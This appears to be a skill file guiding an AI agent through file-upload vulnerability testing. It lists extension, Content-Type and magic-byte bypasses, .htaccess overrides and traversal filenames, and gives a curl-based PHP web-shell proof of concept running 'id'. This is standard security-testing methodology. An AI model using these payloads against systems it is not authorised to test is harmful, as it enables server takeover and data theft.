---
name: file-upload
description: Find and prove file upload vulnerabilities — unrestricted uploads leading to web shell RCE, validation bypasses, and stored XSS via uploaded files. Use when a target has any upload feature (avatar/profile picture, document/attachment upload, image upload, file import), accepts multipart/form-data, relies on Content-Type validation or extension filters, or where uploaded files (SVG, HTML, PHP) may be served or executed. Keywords: file upload, web shell, RCE, .htaccess, extension blacklist, magic bytes, polyglot, SVG XSS, path traversal filename.
---

# File Upload Vulnerabilities

> **Prereq — map first:** Don't test this cold. A target attack-surface map and the relevant happy-flow baseline must exist first — run `/recon-mapper` if not. Test this class against the impact-scored candidate list (highest priority first), reuse the routed `handoff_context`, and pursue chains to real business impact over isolated low-severity bugs.


## When to test
Any feature that accepts a file from the user:
- Avatars / profile pictures
- Document or attachment uploads (support tickets, CMS, messaging)
- Image galleries / media libraries
- Bulk import (CSV/XML/Office docs)
- URL-based "import from link" features
- Endpoints that accept `multipart/form-data` or raw `PUT`

## Impact & priority
- **Web shell RCE (upload an executable script that the server runs) = P1/Critical.** This is the prize: full server control. Always pursue this first when the stack supports it (PHP/JSP/ASPX/etc.).
- **Stored XSS via SVG/HTML served from same origin = High** when it runs in a victim's authenticated session (account/admin takeover). Self-XSS only = noise.
- **SSRF/XXE via parsed files** (XML, Office docs, SVG with external entities, image libs fetching URLs) = High depending on what it reaches.
- **DoS / path traversal write** = context-dependent; only report with concrete impact.

## Detection
1. Upload a legitimate file first; observe the response and find **where the file is served** (response URL, returned path, predictable naming).
2. Re-upload with a **deliberately wrong extension or MIME** (e.g. `.php` content, `Content-Type: image/jpeg`) and watch whether the server accepts it.
3. Fetch the uploaded file. Determine: is it **served as-is** (XSS potential), **executed** (RCE), or **rejected/sanitized**?
4. Map the validation: client-side only? Content-Type header? Extension blacklist/whitelist? Magic-byte check? Test each layer independently.

## Exploitation
- **Unrestricted upload → web shell.** Upload a script that executes a command, then request it. Prove with a harmless command (`id`).
- **Content-Type bypass.** Keep malicious file bytes; set `Content-Type: image/jpeg` (or whatever the filter expects) in the multipart part.
- **Extension blacklist bypass.** Try alternate executable extensions (`.php5`, `.phtml`, `.shtml`, `.jsp`, `.jspx`, `.asp`, `.aspx`), case tricks (`.pHp`), double extensions (`shell.php.jpg`), trailing chars (`shell.php.`, `shell.php%20`, `shell.php%00.jpg`), URL-encoded dot (`shell%2Ephp`), semicolon (`shell.asp;.jpg`).
- **Magic-byte / content validation bypass.** Prepend valid file signature (e.g. `GIF89a;` then `<?php ... ?>`) or embed payload in EXIF metadata to build a polyglot.
- **Override server config.** Upload `.htaccess` (`AddType application/x-httpd-php .xyz`) or `web.config` to make a benign-looking extension executable.
- **Path traversal in filename.** Set `filename="../../shell.php"` to escape the upload dir into a web-executable path.
- **Race conditions.** Exploit the window where a temp file exists before validation/deletion; brute-force predictable temp paths.
- **Client-side attacks.** Upload SVG/HTML with `<script>` for stored XSS when served same-origin; XML/Office for XXE.

Always verify RCE with a **harmless** command (`echo`, `id`) and upload **benign** files only.

## Common bypasses
| Layer | Bypass examples |
|-------|-----------------|
| Client-side JS | Intercept and edit the request in proxy |
| Content-Type | `Content-Type: image/jpeg` on a PHP part |
| Extension blacklist | `.php5 .phtml .shtml .jsp .asp`, `.pHp`, `shell.php.jpg`, `shell.php.`, `shell.php%00.jpg`, `shell%2Ephp`, `shell.asp;.jpg` |
| Extension whitelist | Double extension where wrong half is parsed; null/trailing tricks |
| Magic bytes | `GIF89a;` prefix, EXIF-embedded polyglot |
| Server config | Upload `.htaccess` / `web.config` to map a custom extension |
See `reference.md` for the full breakdown.

## Minimal PoC
Upload a benign PHP one-liner running `id`, then fetch it (log proof to `./_EXPLOIT/`):

```bash
# 1) Upload (benign: runs only `id`)
printf '<?php echo "PoC:"; system("id"); ?>' > /tmp/poc.php
curl -sS -i 'https://TARGET/upload' \
  -H 'Cookie: session=...' \
  -F 'file=@/tmp/poc.php;type=image/jpeg;filename=poc.php'

# 2) Fetch the uploaded file to confirm execution
curl -sS 'https://TARGET/files/poc.php'
# Expected output proving RCE: PoC:uid=33(www-data) gid=33(www-data) ...
```
If `.php` is blocked, retry with bypass variants (filename `poc.php.jpg`, `poc.pHp`, `poc.php%00.jpg`) or a `.htaccess` upload. Record the exact working request + the `id` output in `./_EXPLOIT/`.

## Chain for impact
The impact depends entirely on what the upload becomes:
- **Executable upload → web shell → RCE** = top-tier; prove with a harmless `id`, then `/reporting`.
- **SVG/HTML upload → stored XSS** → `/xss` (victim actions) and `/csrf`.
- **XML/Office upload → `/xxe-injection`**; **filename traversal → `/path-traversal`**; **image/URL fetch on upload → `/ssrf`**.
- A file that is stored but never served/executed is usually noise — chain it to one of the above or drop it.

## Don't report as noise
- A file that is **stored but never served or executed** (no path to trigger it).
- Uploaded HTML/SVG that is **not served from an exploitable origin** or only yields **self-XSS**.
- "Dangerous extension accepted" with **no demonstrated execution/serving**.
- Missing best-practice hardening with **no proven impact**.

## Deep reference
See `reference.md` for the comprehensive methodology. Source: https://portswigger.net/web-security/file-upload
